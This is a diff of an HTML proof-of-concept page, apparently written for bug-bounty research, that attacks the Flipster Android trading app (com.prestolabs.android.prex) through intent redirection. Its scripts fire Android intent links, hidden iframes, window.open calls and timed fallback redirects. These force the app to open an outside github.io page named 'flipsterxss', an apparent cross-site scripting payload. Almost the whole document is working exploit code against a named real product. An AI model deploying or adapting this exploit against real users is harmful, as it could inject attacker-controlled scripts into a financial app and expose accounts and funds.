@@ -6,26 +6,55 @@
 </head>
 <body>
     <h2>Flipster Intent Redirection PoC</h2>
-    <p><a href="https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/">
-        1. Direct HTTPS link
+
+    <p><a href="intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end">
+        1. Intent link
     </a></p>
-    <p><button onclick="tryIntent()">2. Open via Intent</button></p>
-    <p><button onclick="autoOpen()">3. Auto-redirect</button></p>
+
+    <p><a href="intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;action=android.intent.action.VIEW;package=com.prestolabs.android.prex;component=com.prestolabs.android.prex/.presentations.ui.MainActivity;end">
+        2. Intent with component
+    </a></p>
+
+    <p><button onclick="method1()">3. Location redirect</button></p>
+
+    <p><button onclick="method2()">4. Iframe method</button></p>
+
+    <p><button onclick="method3()">5. Window.open</button></p>
+
+    <p><button onclick="method4()">6. Multi-attempt</button></p>
+
     <script>
-    function tryIntent() {
-        var w = window.open("https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/", "_blank");
-        if (!w) {
-            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
-        }
+    var target = "intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end";
+    var direct = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
+
+    function method1() {
+        window.location.href = target;
     }
-    function autoOpen() {
-        var iframe = document.createElement("iframe");
-        iframe.style.display = "none";
-        iframe.src = "intent://flipster.io/https://xaleraf4ra.github.io/flipsterxss/#Intent;scheme=https;package=com.prestolabs.android.prex;end";
-        document.body.appendChild(iframe);
+
+    function method2() {
+        var i = document.createElement("iframe");
+        i.style.display = "none";
+        i.src = target;
+        document.body.appendChild(i);
+    }
+
+    function method3() {
+        window.open(target, "_self");
+    }
+
+    function method4() {
+        var i = document.createElement("iframe");
+        i.style.display = "none";
+        i.src = target;
+        document.body.appendChild(i);
+
         setTimeout(function() {
-            window.location.href = "https://flipster.io/https://xaleraf4ra.github.io/flipsterxss/";
-        }, 2000);
+            window.location.href = target;
+        }, 1000);
+
+        setTimeout(function() {
+            window.location.href = direct;
+        }, 3000);
     }
     </script>
 </body>
